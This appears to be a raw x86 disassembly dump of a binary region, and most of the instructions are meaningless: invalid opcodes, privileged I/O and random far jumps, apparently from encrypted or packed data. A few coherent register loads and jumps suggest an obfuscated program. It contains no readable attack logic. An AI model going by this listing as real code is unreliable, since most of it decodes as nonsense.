  41fdec:	rcr    DWORD PTR [ecx+0x2b3bd2e5],cl
  41fdf2:	test   DWORD PTR [ecx-0x5e],0x8646b839
  41fdf9:	(bad)  [eax+0x16905a86]
  41fdff:	push   ds
  41fe00:	lds    ebp,FWORD PTR [ebx]
  41fe02:	nop
  41fe03:	cmc    
  41fe04:	shr    al,0x76
  41fe07:	ins    BYTE PTR es:[edi],dx
  41fe08:	loop   0x41fd8d
  41fe0a:	bound  esi,QWORD PTR [ecx+edi*1]
  41fe0d:	sbb    WORD PTR [edi+0x45d326d6],dx
  41fe14:	push   edx
  41fe15:	mov    esi,DWORD PTR [eax+0x6cfda3c7]
  41fe1b:	xor    BYTE PTR ds:[esp+eax*4-0x695be978],bh
  41fe23:	jle    0x41fe13
  41fe25:	call   0xaae36b4c
  41fe2a:	add    BYTE PTR [edx+0x5a],dl
  41fe2d:	packssdw mm5,mm7
  41fe30:	ret    0x5e3b
  41fe33:	call   0x198beb58
  41fe38:	mov    ch,0x60
  41fe3a:	cdq    
  41fe3b:	cmp    BYTE PTR [ecx+eax*8],cl
  41fe3e:	xor    al,0x54
  41fe40:	xor    DWORD PTR [ebx-0x30],eax
  41fe43:	int3   
  41fe44:	sub    BYTE PTR [ebx+eiz*8],0x98
  41fe48:	or     eax,0xc29801b9
  41fe4d:	mov    bl,0x1a
  41fe4f:	push   ds
  41fe50:	xor    al,0xe
  41fe52:	add    BYTE PTR [esi-0x5d],0x53
  41fe56:	add    DWORD PTR [edi+edi*1+0xe51cef0],0xffffffcb
  41fe5e:	sbb    bh,BYTE PTR [ecx]
  41fe60:	mov    ebp,0x5cbefbb1
  41fe65:	ja     0x41fe76
  41fe67:	push   ebp
  41fe68:	xchg   esp,eax
  41fe69:	inc    ebx
  41fe6a:	mov    al,ds:0x3af11dbf
  41fe6f:	mov    ds:0x5f6fd1f1,al
  41fe74:	sbb    eax,0xee614d2f
  41fe79:	and    al,0x2b
  41fe7b:	hlt    
  41fe7c:	cmp    bl,BYTE PTR [esi]
  41fe7e:	int3   
  41fe7f:	retf   0xea15
  41fe82:	jle    0x41fef7
  41fe84:	in     eax,0x5e
  41fe86:	xchg   esi,eax
  41fe87:	mov    dl,0x34
  41fe89:	into   
  41fe8a:	add    ebp,esp
  41fe8c:	sbb    eax,0x1ccd396f
  41fe91:	test   al,0x86
  41fe93:	outs   dx,DWORD PTR ds:[esi]
  41fe94:	sti    
  41fe95:	stos   DWORD PTR es:[edi],eax
  41fe96:	sbb    cl,BYTE PTR [edx-0xc47da82]
  41fe9c:	adc    esi,DWORD PTR [eax-0x67]
  41fe9f:	test   eax,0xacd7865c
  41fea4:	push   esi
  41fea5:	scas   al,BYTE PTR es:[edi]
  41fea6:	fidiv  DWORD PTR [edx]
  41fea8:	leave  
  41fea9:	lahf   
  41feaa:	and    al,0xec
  41feac:	popf   
  41fead:	dec    eax
  41feae:	pop    edx
  41feaf:	push   esi
  41feb0:	popf   
  41feb1:	or     BYTE PTR [edi+0x7c],cl
  41feb4:	jns    0x41fedc
  41feb6:	lds    ebx,FWORD PTR ds:0x70be5795
  41febc:	fwait
  41febd:	je     0x41fe8e
  41febf:	adc    eax,0xaac2548e
  41fec4:	retf   
  41fec5:	mov    ah,0x19
  41fec7:	xor    dl,al
  41fec9:	xchg   BYTE PTR [ebx],bl
  41fecb:	out    0x73,eax
  41fecd:	and    BYTE PTR [esi+0x79],bh
  41fed0:	jbe    0x41fe97
  41fed2:	xchg   ebp,eax
  41fed3:	cs retf 
  41fed5:	(bad)  
  41fed6:	sbb    al,0xe7
  41fed8:	out    0x95,eax
  41feda:	xchg   ebp,eax
  41fedb:	test   BYTE PTR ds:0xc51db54b,0x28
  41fee2:	mov    bh,BYTE PTR [esp+esi*1+0x23]
  41fee6:	lds    edx,FWORD PTR [edx+0x5d277e73]
  41feec:	or     edi,eax
  41feee:	dec    esp
  41feef:	(bad)  
  41fef0:	outs   dx,DWORD PTR ds:[esi]
  41fef1:	push   ebx
  41fef2:	loopne 0x41ff66
  41fef4:	aad    0x52
  41fef6:	scas   eax,DWORD PTR es:[edi]
  41fef7:	cwde   
  41fef8:	int    0x42
  41fefa:	out    0x6b,al
  41fefc:	pop    ecx
  41fefd:	dec    eax
  41fefe:	jecxz  0x41ff56
  41ff00:	push   ss
  41ff01:	xchg   BYTE PTR [ebp-0x19],cl
  41ff04:	fidivr DWORD PTR [eax-0x38]
  41ff07:	stc    
  41ff08:	mov    esi,eax
  41ff0a:	daa    
  41ff0b:	fcomp  QWORD PTR [edx-0x3e798dfe]
  41ff11:	pusha  
  41ff12:	loop   0x41ff21
  41ff14:	dec    esp
  41ff15:	lock outs dx,DWORD PTR ds:[esi]
  41ff17:	mov    ebp,0xc76bbb8d
  41ff1d:	stos   DWORD PTR es:[edi],eax
  41ff1e:	sbb    eax,DWORD PTR [esi-0x58]
  41ff21:	sbb    BYTE PTR [ebp+esi*8-0x6b4989ab],ah
  41ff28:	pop    ds
  41ff29:	or     bl,BYTE PTR [eax+0x22d2b1b0]
  41ff2f:	fdiv   QWORD PTR [eax+0x65b785f2]
  41ff35:	cwde   
  41ff36:	jle    0x41ff34
  41ff38:	cmp    al,0x6c
  41ff3a:	(bad)  
  41ff3b:	lock jge 0x41ff27
  41ff3e:	lods   al,BYTE PTR ds:[esi]
  41ff3f:	push   cs
  41ff40:	pop    ds
  41ff41:	jnp    0x41ff92
  41ff43:	jecxz  0x41ffba
  41ff45:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41ff47:	pop    eax
  41ff48:	push   esp
  41ff4a:	imul   ebx,DWORD PTR [ebx+0x4b],0x203c4b9b
  41ff51:	repnz adc esi,esi
  41ff54:	or     eax,0x92b29311
  41ff59:	mov    edi,?
  41ff5b:	pop    esp
  41ff5c:	ret    
  41ff5d:	xchg   ebx,eax
  41ff5e:	sbb    esi,eax
  41ff60:	dec    ebx
  41ff61:	jge    0x41ffd2
  41ff63:	xor    dl,BYTE PTR [edi-0x44]
  41ff66:	add    WORD PTR ds:0xf731e706,0x91f6
  41ff6f:	dec    edx
  41ff70:	aad    0xf
  41ff72:	scas   eax,DWORD PTR es:[edi]
  41ff73:	xlat   BYTE PTR ds:[ebx]
  41ff74:	mov    edi,DWORD PTR [ebp-0x8]
  41ff77:	mov    ebx,DWORD PTR [ebp-0x10]
  41ff7a:	sub    ebx,edi
  41ff7c:	cmp    ebx,edx
  41ff7e:	jmp    0x420490
  41ff83:	rcl    bh,1
  41ff85:	ror    ebp,1
  41ff87:	rcr    ecx,1
  41ff89:	aam    0xd5
  41ff8b:	pop    edx
  41ff8c:	inc    esi
  41ff8d:	daa    
  41ff8e:	clc    
  41ff8f:	mov    bh,0x25
  41ff91:	icebp  
  41ff92:	sahf   
  41ff93:	sub    dl,BYTE PTR [esi+0x7f]
  41ff96:	js     0x42000b
  41ff98:	jl     0x420012
  41ff9a:	js     0x41ffa3
  41ff9c:	dec    esi
  41ff9d:	mov    esi,0x1351adb3
  41ffa2:	dec    ebp
  41ffa3:	pop    ss
  41ffa4:	or     bh,bh
  41ffa6:	push   esp
  41ffa7:	and    al,0x77
  41ffa9:	(bad)  
  41ffaa:	sub    DWORD PTR [ebx+eiz*8],esi
  41ffad:	lods   al,BYTE PTR gs:[esi]
  41ffaf:	ja     0x41ffa1
  41ffb1:	sub    ebp,DWORD PTR [esp+ebx*1-0x463e5a3e]
  41ffb8:	pop    ebp
  41ffb9:	mov    esi,0x76a3a2cd
  41ffbe:	arpl   dx,ax
  41ffc0:	sti    
  41ffc1:	pop    edi
  41ffc2:	in     al,dx
  41ffc3:	cdq    
  41ffc4:	fstp   DWORD PTR [eax-0x7b3d5d64]
  41ffca:	(bad)  
  41ffcb:	je     0x41ff69
  41ffcd:	ins    BYTE PTR es:[edi],dx
  41ffce:	call   0x5b08:0x8d2e7994
  41ffd5:	jns    0x41ffbe
  41ffd7:	nop    ebx
  41ffda:	cmp    eax,0x11d86cd4
  41ffdf:	test   eax,0x489ff712
  41ffe4:	push   edi
  41ffe5:	and    bh,BYTE PTR [ebx+ebp*1-0x3a]
  41ffe9:	cli    
  41ffea:	xor    eax,0xc84d5fd0
  41ffef:	fdivr  st,st(5)
  41fff1:	rol    BYTE PTR [esi+0x17180236],0x46
  41fff8:	mov    eax,0x17e42af
  41fffd:	inc    esp
  41fffe:	sub    cl,al
  420000:	or     esi,ecx
  420002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420003:	mov    ebp,0x6c3caac2
  420008:	jnp    0x41ffac
  42000a:	sbb    al,0x3f
  42000c:	jmp    0xedd87fe9
  420011:	adc    bh,cl
  420013:	retf   
  420014:	retf   0x1b50
  420017:	mov    esp,0x8a4deba
  42001c:	or     DWORD PTR [eax+0x7],eax
  42001f:	jo     0x420049
  420021:	shr    DWORD PTR [esi+ecx*4-0x1db89a76],0x4a
  420029:	mov    bh,al
  42002b:	lds    esp,FWORD PTR [eax-0x5debba3d]
  420031:	repnz and ah,BYTE PTR [ebx-0x601a984a]
  420038:	not    bl
  42003a:	push   edi
  42003b:	aam    0x88
  42003d:	or     al,0xcd
  420040:	mov    ah,0x54
  420042:	pusha  
  420043:	shr    DWORD PTR [edi+edi*4],1
  420046:	dec    edx
  420047:	rcr    DWORD PTR [ecx-0x531ff9e5],cl
  42004d:	popf   
  42004e:	xor    esp,DWORD PTR [ebp-0x691b694e]
  420054:	ins    DWORD PTR es:[edi],dx
  420055:	inc    ecx
  420056:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420057:	sahf   
  420058:	and    eax,0x757ce218
  42005d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42005e:	test   al,0xf6
  420060:	fstp   TBYTE PTR [edx-0x369f9abb]
  420066:	(bad)  [edi+0x4e]
  420069:	sbb    DWORD PTR [esi],edi
  42006b:	jno    0x42008c
  42006d:	xor    eax,0x9849f589
  420072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420073:	pop    es
  420074:	cmp    ebp,esp
  420076:	jmp    0x4200ce
  420078:	push   0xcfc0332d
  42007d:	xchg   esi,eax
  42007e:	sti    
  42007f:	fadd   DWORD PTR [eax]
  420081:	mov    esp,0xde2017a
  420086:	ds push ebp
  420088:	test   esi,eax
  42008a:	xor    DWORD PTR [ebx],edx
  42008c:	or     BYTE PTR [edi],bh
  42008e:	lds    edi,FWORD PTR [esp+eiz*4+0x42]
  420092:	mov    BYTE PTR [esi-0x60ef70b7],dh
  420098:	imul   ebx,DWORD PTR [ecx+0x18e6adf3],0x846d7575
  4200a2:	pop    esp
  4200a3:	jecxz  0x420112
  4200a5:	inc    eax
  4200a6:	call   0xc65:0x6af0db78
  4200ad:	pop    ecx
  4200ae:	jle    0x4200ce
  4200b0:	push   cs
  4200b1:	mov    eax,ds:0x4010d1d5
  4200b6:	ja     0x42006a
  4200b8:	fcomp  DWORD PTR [eax+eax*4]
  4200bb:	(bad)  
  4200bc:	rol    DWORD PTR [eax+0x72c53133],cl
  4200c2:	push   cs
  4200c3:	data16 stc 
  4200c5:	add    DWORD PTR ds:0xdb16fb44,esi
  4200cb:	mov    al,ds:0xd0c175a6
  4200d0:	js     0x42013b
  4200d2:	dec    edi
  4200d3:	sti    
  4200d4:	mov    bl,0xc
  4200d6:	out    dx,eax
  4200d7:	int    0xe1
  4200d9:	pop    es
  4200da:	dec    edx
  4200db:	cmp    al,0xf8
  4200dd:	shl    DWORD PTR [eax-0x39],cl
  4200e0:	add    eax,0x710001dc
  4200e5:	lds    esi,FWORD PTR ds:0xec3510d1
  4200eb:	mov    edi,0x89abf705
  4200f0:	jl     0x4200d7
  4200f2:	test   DWORD PTR [ecx],eax
  4200f4:	fnsave [eax+ecx*4-0x3a]
  4200f8:	jae    0x4200fd
  4200fa:	(bad)  
  4200fb:	and    edi,DWORD PTR [esi-0x43ba0843]
  420101:	int    0x5e
  420103:	jnp    0x420182
  420105:	sub    ebp,0xffffffa2
  420108:	cwde   
  420109:	aad    0x5f
  42010b:	xchg   esp,eax
  42010c:	in     al,dx
  42010d:	adc    al,0xd0
  42010f:	dec    edx
  420110:	and    ebx,DWORD PTR [edx-0x6d]
  420113:	sub    DWORD PTR [edi],edi
  420115:	popa   
  420116:	test   BYTE PTR [esi+0x3c],dl
  420119:	and    ebx,edi
  42011b:	inc    DWORD PTR [eax]
  42011d:	and    al,0x42
  42011f:	jns    0x4200e5
  420121:	cmc    
  420122:	retf   
  420123:	dec    esi
  420124:	xor    esi,DWORD PTR [ecx+0x38]
  420127:	aam    0xb9
  420129:	pushf  
  42012a:	fstp   DWORD PTR [eax]
  42012c:	lods   al,BYTE PTR ds:[esi]
  42012d:	jge    0x4200e6
  42012f:	js     0x4200d7
  420131:	fcomip st,st(3)
  420133:	out    0xf4,al
  420135:	fs dec ebp
  420137:	leave  
  420138:	jne    0x42016b
  42013a:	inc    ecx
  42013b:	push   0xffffffb8
  42013d:	dec    eax
  42013e:	ret    0xa626
  420141:	mov    dl,0x75
  420143:	mov    bh,0xec
  420145:	adc    DWORD PTR [ebx-0x551e6fa5],ebx
  42014b:	xlat   BYTE PTR ds:[ebx]
  42014c:	mov    ds:0xd66044a9,eax
  420151:	pop    ebx
  420152:	push   esi
  420153:	pop    esp
  420154:	mov    dl,dl
  420156:	push   edi
  420157:	std    
  420158:	sub    eax,0xcaf7d558
  42015d:	dec    edx
  42015e:	cmp    BYTE PTR [eax+0x14],ah
  420161:	sub    al,0x21
  420163:	jne    0x4201b4
  420165:	(bad)  
  420166:	into   
  420167:	rcl    ch,1
  420169:	retf   0x1407
  42016c:	jnp    0x420118
  42016e:	test   al,0x65
  420170:	mov    ebp,0x3db01e33
  420175:	xchg   BYTE PTR [edi+0x5b854fa5],dl
  42017b:	sbb    DWORD PTR [edi+0x2898adf0],ebx
  420181:	into   
  420182:	ja     0x4201f8
  420184:	sbb    BYTE PTR [ebx+ebx*2],bh
  420187:	add    eax,0xfebf5134
  42018c:	push   edx
  42018d:	xchg   ebp,eax
  42018e:	and    eax,0xa8dda523
  420193:	push   esi
  420194:	push   esp
  420195:	pop    ebx
  420196:	(bad)  [eax+0x44a26a64]
  42019c:	pop    eax
  42019d:	cmp    BYTE PTR [ecx+edx*2+0x6],al
  4201a1:	in     al,0x7a
  4201a3:	sbb    DWORD PTR [ecx-0x60],ecx
  4201a6:	jg     0x420226
  4201a8:	xchg   DWORD PTR [edx+0xe],ebx
  4201ab:	js     0x4201a6
  4201ad:	pusha  
  4201ae:	out    0x28,al
  4201b0:	bound  esp,QWORD PTR [ebx+0x7d]
  4201b3:	mov    ebx,0x1569bd5
  4201b8:	inc    esi
  4201b9:	add    dl,bl
  4201bb:	or     eax,0x1a1ea7f6
  4201c0:	xchg   edi,eax
  4201c1:	shl    BYTE PTR [edx-0x5c],cl
  4201c4:	pushf  
  4201c5:	sbb    bh,dl
  4201c7:	mov    edx,0xcc82f1fc
  4201cc:	push   esp
  4201cd:	cmp    bh,BYTE PTR [edx+0x16747d58]
  4201d3:	dec    eax
  4201d4:	mov    bl,0x18
  4201d6:	fdiv   st,st(7)
  4201d8:	sbb    edi,DWORD PTR [ebp+0x3966078]
  4201de:	xchg   ebp,eax
  4201df:	jo     0x4201e4
  4201e1:	mov    DWORD PTR ss:[eax-0x1374db90],ebp
  4201e8:	mov    fs,WORD PTR [esi-0x3c]
  4201eb:	call   0xede36dd1
  4201f0:	mov    edi,0x4d28e519
  4201f5:	lods   eax,DWORD PTR ds:[esi]
  4201f6:	into   
  4201f7:	xor    ebp,0x1fedb5df
  4201fd:	mov    ecx,0x2884045
  420202:	inc    esi
  420203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420204:	inc    ecx
  420205:	lea    edx,[eax+0x1b8efccf]
  42020b:	adc    DWORD PTR [edx-0x3e1557dc],esi
  420211:	outs   dx,DWORD PTR ds:[esi]
  420212:	(bad)  
  420213:	cmp    eax,0xb88cefcf
  420218:	dec    ebp
  420219:	inc    edi
  42021a:	(bad)  
  42021b:	mov    esi,0xafb38b5a
  420220:	mov    dh,0x8c
  420222:	and    DWORD PTR [ebx+ebx*4],ecx
  420225:	jno    0x4201b3
  420227:	dec    edx
  420228:	rcr    cl,1
  42022a:	int3   
  42022b:	les    ebx,FWORD PTR [esi]
  42022d:	repz inc edi
  42022f:	or     dh,cl
  420231:	adc    DWORD PTR [ebx+0x4ccfea1f],ecx
  420237:	(bad)  
  420239:	mov    eax,ds:0x46196fd5
  42023e:	sti    
  42023f:	jb     0x420233
  420241:	adc    BYTE PTR [esi-0x73],bl
  420244:	and    al,0x3c
  420246:	js     0x4202ad
  420248:	cwde   
  420249:	sub    ecx,DWORD PTR [eax+eax*8-0x3c]
  42024d:	ja     0x4202b1
  42024f:	mov    eax,0xa83bb462
  420254:	retf   
  420255:	cdq    
  420256:	xchg   ebx,eax
  420257:	pop    eax
  420258:	xchg   edi,eax
  420259:	pop    ss
  42025a:	sbb    eax,0x701ccde3
  42025f:	fmul   st,st(3)
  420261:	aam    0x9
  420263:	inc    ebx
  420264:	pop    es
  420265:	das    
  420266:	jecxz  0x4201f2
  420268:	jmp    0xb09624d3
  42026d:	js     0x42025b
  42026f:	js     0x4202e5
  420271:	sub    edi,DWORD PTR ds:0x1f02986e
  420277:	jmp    0x42029e
  420279:	hlt    
  42027a:	inc    esp
  42027b:	mov    ds:0xb6693521,eax
  420280:	pusha  
  420281:	stos   BYTE PTR es:[edi],al
  420282:	jno    0x4202dc
  420284:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420286:	pop    ebx
  420287:	inc    edi
  420288:	push   ecx
  420289:	(bad)  
  42028a:	cld    
  42028b:	into   
  42028c:	ja     0x420233
  42028e:	popf   
  42028f:	imul   ecx,DWORD PTR [ecx+esi*4+0x15],0xb17e7f2
  420297:	add    esi,DWORD PTR [edx+0xb]
  42029a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42029b:	fstp   TBYTE PTR [ebp+0x32c712e5]
  4202a1:	mov    ebp,es
  4202a3:	sahf   
  4202a4:	ret    
  4202a5:	aam    0x6b
  4202a7:	xor    ebp,DWORD PTR [edx+0x22]
  4202aa:	aas    
  4202ab:	xchg   ebp,eax
  4202ac:	inc    edx
  4202ad:	add    ah,BYTE PTR [ebx+esi*1-0x67]
  4202b1:	or     al,0x7b
  4202b3:	sub    ch,BYTE PTR [eax+0x57b39b2e]
  4202b9:	loope  0x4202c3
  4202bb:	dec    ebp
  4202bc:	mov    edi,0x375eab8c
  4202c1:	inc    ecx
  4202c2:	scas   eax,DWORD PTR es:[edi]
  4202c3:	sub    eax,esi
  4202c5:	stos   DWORD PTR es:[edi],eax
  4202c6:	dec    edx
  4202c7:	and    esi,DWORD PTR [ecx+0x7a10b1af]
  4202cd:	leave  
  4202ce:	dec    ecx
  4202cf:	retf   
  4202d0:	stos   BYTE PTR es:[edi],al
  4202d1:	sub    edi,DWORD PTR ds:0xf77d10ab
  4202d7:	lahf   
  4202d8:	shl    ebp,0xd6
  4202db:	imul   esp,DWORD PTR [ebx+0x74],0x394d403b
  4202e2:	int    0xa4
  4202e4:	fstp   DWORD PTR [edx-0x7]
  4202e7:	cmp    al,0xc1
  4202e9:	bound  esi,QWORD PTR [ecx+ebx*1+0x35]
  4202ed:	mov    eax,0x13257e56
  4202f2:	mov    al,0x19
  4202f4:	and    al,0x8f
  4202f6:	xor    cl,BYTE PTR [ecx]
  4202f8:	pusha  
  4202f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202fa:	push   edi
  4202fb:	scas   al,BYTE PTR es:[edi]
  4202fc:	and    esi,DWORD PTR [eax+eax*4]
  4202ff:	jns    0x420378
  420301:	sti    
  420302:	inc    ebx
  420303:	ja     0x4202ed
  420305:	fs pop ss
  420307:	push   cs
  420308:	sti    
  420309:	(bad)  [ecx]
  42030b:	xor    eax,0x517a9767
  420310:	fwait
  420311:	mov    ebx,0x5cab986a
  420316:	sub    eax,0xbafb7b12
  42031b:	mov    ebx,?
  42031d:	mov    cl,0xa7
  42031f:	imul   edx
  420321:	or     DWORD PTR [esi+ebx*4],0x6d
  420325:	arpl   WORD PTR [eax],di
  420327:	ret    
  420328:	pop    es
  420329:	(bad)  
  42032a:	idiv   BYTE PTR [edx+ecx*2+0x45cfdffb]
  420331:	clc    
  420332:	xor    eax,0x5050eac8
  420337:	and    DWORD PTR [eax],0xffffffdd
  42033a:	retf   0x347f
  42033d:	out    dx,eax
  42033e:	repnz repz ds push cs
  420342:	lods   al,BYTE PTR ds:[esi]
  420343:	test   DWORD PTR cs:[edi+esi*1],ecx
  420347:	popf   
  420348:	frstpm(287 only) 
  42034a:	shr    cl,0xf8
  42034d:	push   esi
  42034e:	and    al,0x47
  420350:	cmp    BYTE PTR [edi],ah
  420352:	or     al,0x70
  420354:	ds sar bh,cl
  420357:	in     al,dx
  420358:	jp     0x4202f1
  42035a:	daa    
  42035b:	retf   
  42035c:	pop    edi
  42035d:	inc    edx
  42035e:	push   ebp
  42035f:	retf   0xee28
  420362:	mov    edi,0x4c7fd5f1
  420367:	jo     0x42034d
  420369:	sbb    edi,esp
  42036b:	retf   0x4cc0
  42036e:	add    al,0x95
  420370:	std    
  420371:	jnp    0x4203a8
  420373:	pop    edi
  420374:	sbb    eax,0x1d27c943
  420379:	les    esi,FWORD PTR [edx]
  42037b:	pushf  
  42037c:	scas   al,BYTE PTR es:[edi]
  42037d:	mov    DWORD PTR [edx*8-0x56a0fbb8],ebp
  420384:	and    edi,DWORD PTR [edi+0x671a8d55]
  42038a:	sbb    DWORD PTR [edx+ebx*2-0x1],0xffffffd6
  42038f:	cmp    bh,BYTE PTR ds:0xce74abac
  420395:	repnz stos BYTE PTR es:[edi],al
  420397:	dec    ebx
  420398:	mov    ecx,0x3dfea32b
  42039d:	jno    0x420376
  42039f:	and    BYTE PTR [ebp-0x46],cl
  4203a2:	ror    esp,cl
  4203a4:	(bad)  
  4203a5:	aam    0x71
  4203a7:	cmp    ch,BYTE PTR [ecx+0x48]
  4203aa:	adc    DWORD PTR [ebp-0x1a],esp
  4203ad:	ret    0x5100
  4203b0:	adc    al,0x40
  4203b2:	pop    edi
  4203b3:	inc    ecx
  4203b4:	jne    0x420397
  4203b6:	js     0x42035e
  4203b8:	pop    edx
  4203b9:	pop    eax
  4203ba:	mov    edi,0x42407c59
  4203bf:	cmc    
  4203c0:	fadd   DWORD PTR [ecx+edx*2+0xe]
  4203c4:	sub    eax,0x6a01a74e
  4203c9:	or     eax,0x1d8573c2
  4203ce:	ja     0x42042a
  4203d0:	movq   QWORD PTR [ebx+esi*8+0x5d],mm7
  4203d5:	add    eax,0xea73512d
  4203da:	cmp    eax,esi
  4203dc:	push   esi
  4203dd:	mov    al,ds:0xb3e4c470
  4203e2:	mov    al,0xa1
  4203e4:	jae    0x4203e0
  4203e6:	xor    al,0xb1
  4203e8:	adc    eax,DWORD PTR [ebx]
  4203ea:	ret    
  4203eb:	int3   
  4203ec:	(bad)  
  4203ed:	jecxz  0x4203c6
  4203ef:	mov    ch,0x7b
  4203f1:	(bad)  
  4203f2:	in     al,dx
  4203f3:	xor    ah,ah
  4203f5:	sub    BYTE PTR [edx-0x7c],bh
  4203f8:	lods   eax,DWORD PTR ds:[esi]
  4203f9:	jb     0x420390
  4203fb:	pop    ds
  4203fc:	mov    ch,0xc9
  4203fe:	out    0x1,al
  420400:	sub    esp,esi
  420402:	pop    eax
  420403:	cmp    eax,0x70835370
  420408:	clc    
  420409:	and    cl,dl
  42040b:	mov    esp,0x2fd81084
  420410:	jo     0x420489
  420412:	adc    bh,BYTE PTR [ebx+esi*8+0x13]
  420416:	(bad)  
  420417:	lock adc DWORD PTR [esi+esi*8-0x5f],0xffffff8d
  42041d:	imul   edx,ebp,0xffffffb8
  420420:	stc    
  420421:	lea    eax,[esi+0x6506b80d]
  420427:	jge    0x420446
  420429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42042a:	or     BYTE PTR [eax-0x50],al
  42042d:	and    BYTE PTR [esi],ch
  42042f:	jp     0x420439
  420431:	dec    edi
  420432:	ds jne 0x4203e2
  420435:	jl     0x4203ba
  420437:	jno    0x4204a0
  420439:	ror    bl,0x26
  42043c:	mov    ebx,0xc0e85726
  420441:	xchg   esp,esp
  420443:	sub    edx,DWORD PTR [esi]
  420445:	mov    cl,0xba
  420447:	icebp  
  420448:	hlt    
  420449:	push   ds
  42044a:	adc    DWORD PTR [ebx],edx
  42044c:	and    DWORD PTR [esi-0x335f242c],edx
  420452:	not    BYTE PTR [ebx+0x63]
  420455:	scas   al,BYTE PTR es:[di]
  420457:	adc    ebp,ecx
  420459:	push   edi
  42045a:	imul   esi,DWORD PTR [esi+0x5e],0xffffff81
  42045e:	sbb    DWORD PTR [ebx-0x681c4dd],esi
  420464:	in     al,dx
  420465:	add    ebp,edi
  420467:	mov    dl,0xb0
  420469:	mov    BYTE PTR [edi],dh
  42046b:	ss sbb edi,ecx
  42046e:	bnd jo 0x4204c5
  420471:	mov    edx,0xb9f00bf1
  420476:	jne    0x420475
  420478:	cdq    
  420479:	add    BYTE PTR [ebx-0x71f3c775],al
  42047f:	loopne 0x420446
  420481:	cli    
  420482:	mov    WORD PTR [esi-0x32577b51],ds
  420488:	inc    edi
  420489:	mov    ds:0x219687c2,al
  42048e:	inc    edx
  42048f:	xchg   ecx,eax
  420490:	ja     0x42049e
  420496:	mov    edx,DWORD PTR [ebp-0x2c]
  420499:	jmp    0x4228c5
  42049e:	mov    edx,DWORD PTR [ebp-0x34]
  4204a1:	mov    edi,DWORD PTR [ebp-0x4]
  4204a4:	xor    edx,eax
  4204a6:	xor    edi,eax
  4204a8:	jmp    0x4209ba
  4204ad:	retf   
  4204ae:	ds rol bl,1
  4204b1:	(bad)  
  4204b3:	fcmovnb st,st(6)
  4204b5:	push   DWORD PTR [edi+0x2247db6c]
  4204bb:	repz nop DWORD PTR [ecx+0x7f]
  4204c0:	js     0x420535
  4204c2:	jl     0x42053c
  4204c4:	js     0x42050f
  4204c6:	xlat   BYTE PTR ds:[ebx]
  4204c7:	or     eax,0x51578659
  4204cc:	adc    ebp,DWORD PTR [eax]
  4204ce:	jnp    0x420472
  4204d0:	mov    esi,0xff964d3d
  4204d5:	bound  edi,QWORD PTR [ecx+0x47]
  4204d8:	mov    dh,0x2e
  4204da:	and    DWORD PTR [ebx+0x7],ebp
  4204dd:	dec    eax
  4204de:	in     eax,0x85
  4204e0:	cmp    eax,0x7d9eb6bd
  4204e5:	push   ecx
  4204e6:	xchg   esp,eax
  4204e7:	enter  0x4b2b,0xd4
  4204eb:	cmp    esp,ecx
  4204ed:	in     eax,0x9e
  4204ef:	and    BYTE PTR [esi],ch
  4204f1:	popa   
  4204f2:	in     al,dx
  4204f3:	rcr    BYTE PTR [eax],1
  4204f5:	in     eax,0xd7
  4204f7:	or     DWORD PTR ds:0xd782bd6,eax
  4204fd:	xor    esi,DWORD PTR [ebp-0x2be32889]
  420503:	es jne 0x4204e0
  420506:	dec    ebp
  420507:	xor    bh,cl
  420509:	push   esi
  42050a:	dec    ecx
  42050b:	fnstenv [edx+0xe]
  42050e:	(bad)  
  420510:	fbstp  TBYTE PTR [ebx-0xd]
  420513:	fcomp  DWORD PTR [esi]
  420515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420516:	push   ebp
  420517:	loop   0x420522
  420519:	pushf  
  42051a:	xchg   edi,eax
  42051b:	xchg   bl,ah
  42051d:	in     eax,0x4
  42051f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420520:	mov    al,ds:0x5aabfec4
  420525:	push   ecx
  420526:	into   
  420527:	shr    ch,0x12
  42052a:	jb     0x420589
  42052c:	pop    edi
  42052d:	ficomp WORD PTR [ebp+0xcd724a9]
  420533:	sbb    ebp,DWORD PTR [eax-0x77]
  420536:	mov    ebp,0x3dcc0cb9
  42053b:	(bad)
  42053e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42053f:	pop    es
  420540:	xchg   esp,eax
  420541:	js     0x4205bd
  420543:	mov    eax,ds:0xfc850dda
  420548:	aam    0xbc
  42054a:	and    al,0x9d
  42054c:	sub    eax,0x6fb801c0
  420551:	and    edi,DWORD PTR [ecx]
  420553:	add    BYTE PTR [ebx+0x49],ch
  420556:	call   DWORD PTR [eax+0x7e]
  420559:	aaa    
  42055a:	not    ch
  42055c:	push   0x96e38a19
  420561:	mov    eax,ds:0x363f27d9
  420566:	cli    
  420567:	inc    edi
  420568:	sbb    eax,0x589ba4d1
  42056d:	add    dl,dl
  42056f:	fmul   QWORD PTR [esi-0x51]
  420572:	inc    ebx
  420573:	loop   0x420509
  420575:	xchg   ebp,eax
  420576:	lds    esp,FWORD PTR [esi-0x3c]
  420579:	call   0xaec4:0x5a6316bb
  420580:	out    dx,eax
  420581:	or     al,0x24
  420583:	(bad)  
  420584:	lea    ebp,[eax+0x1d3dcadb]
  42058a:	jns    0x42050c
  42058c:	mov    al,0x13
  42058e:	mov    bh,BYTE PTR [edi]
  420590:	add    bl,BYTE PTR [ebx]
  420592:	adc    ah,bl
  420594:	mov    eax,0xbf8769a0
  420599:	cwde   
  42059a:	mov    ds:0x6506a200,al
  42059f:	sub    eax,0x93dbea56
  4205a4:	shr    BYTE PTR [esi+0x27],1
  4205a7:	and    bl,BYTE PTR [ecx+0x42]
  4205aa:	jecxz  0x420578
  4205ac:	pop    ss
  4205ad:	(bad)
  4205b1:	leave  
  4205b2:	sbb    al,dh
  4205b4:	out    0x19,eax
  4205b6:	jae    0x4205b0
  4205b8:	js     0x42055f
  4205ba:	add    edx,DWORD PTR [esi+eax*1-0x6a170a65]
